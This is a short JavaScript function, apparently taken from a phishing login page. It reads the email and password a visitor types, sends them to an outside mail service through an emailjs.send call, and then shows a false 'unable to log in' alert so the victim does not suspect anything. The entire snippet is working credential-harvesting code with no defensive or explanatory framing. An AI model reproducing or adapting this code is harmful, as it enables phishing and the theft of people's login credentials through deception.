function sendMail(){
  let parms = {
    email : document.getElementById('email').value,
    password : document.getElementById('password').value
  }

  emailjs.send('service_sxs3kpo', parms).then(alert("unable to log in.. Close tab and try again!!!"))
}